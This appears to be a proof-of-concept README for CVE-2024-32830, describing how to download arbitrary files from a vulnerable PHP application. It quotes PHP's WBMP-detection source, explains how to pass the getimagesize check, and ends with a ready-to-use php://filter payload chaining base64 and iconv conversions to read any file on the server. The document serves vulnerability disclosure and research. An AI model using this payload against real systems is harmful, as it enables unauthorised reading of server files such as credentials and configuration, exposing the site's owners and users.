# CVE-2024-32830-poc
PoC code to download files with CVE-2024-32830

## `getimagesize` bypass

To bypass the `getimagesize` restriction, we can create a simple `image/vnd.wap.wbmp` image for PHP.

The check for the filetype is very simple:
```c
// https://github.com/php/php-src/blob/0029d2b08bbd3cb3aa293d9c8d55bf31faa9e203/ext/standard/image.c#L917
static int php_get_wbmp(php_stream *stream, struct gfxinfo **result, int check)
{
	int i, width = 0, height = 0;

	if (php_stream_rewind(stream)) {
		return 0;
	}

	/* get type */
	if (php_stream_getc(stream) != 0) {
		return 0;
	}

	/* skip header */
	do {
		i = php_stream_getc(stream);
		if (i < 0) {
			return 0;
		}
	} while (i & 0x80);

	/* get width */
	do {
		i = php_stream_getc(stream);
		if (i < 0) {
			return 0;
		}
		width = (width << 7) | (i & 0x7f);
		/* maximum valid width for wbmp (although 127 may be a more accurate one) */
		if (width > 2048) {
			return 0;
		}
	} while (i & 0x80);

	/* get height */
	do {
		i = php_stream_getc(stream);
		if (i < 0) {
			return 0;
		}
		height = (height << 7) | (i & 0x7f);
		/* maximum valid height for wbmp (although 127 may be a more accurate one) */
		if (height > 2048) {
			return 0;
		}
	} while (i & 0x80);

	if (!height || !width) {
		return 0;
	}

	if (!check) {
		(*result)->width = width;
		(*result)->height = height;
	}

	return IMAGE_FILETYPE_WBMP;
}
```

The simplest way to construct a valid image would be with two NUL bytes, followed by two `< 0x80` bytes for the width and height.

It's possible to do this for any file, using `php://filter`.

The first layer would need to apply a base64 encoding to ensure that all the data is ASCII, thus satisfying the `< 0x80` constraint.

The second filter would need to add the first two NUL bytes. This is possible by forcing a conversion from UTF-16BE to UTF-32BE. This will force iconv to interpret each chunk of two bytes as a valid UTF-16BE character, and then prepend two NUL bytes before it to make it UTF-32BE. The actual filter to use is: `convert.iconv.utf-16be.utf-32be`.

Our final payload is `php://filter/convert.base64-encode/convert.iconv.utf-16be.utf-32be/resource=<file here>`.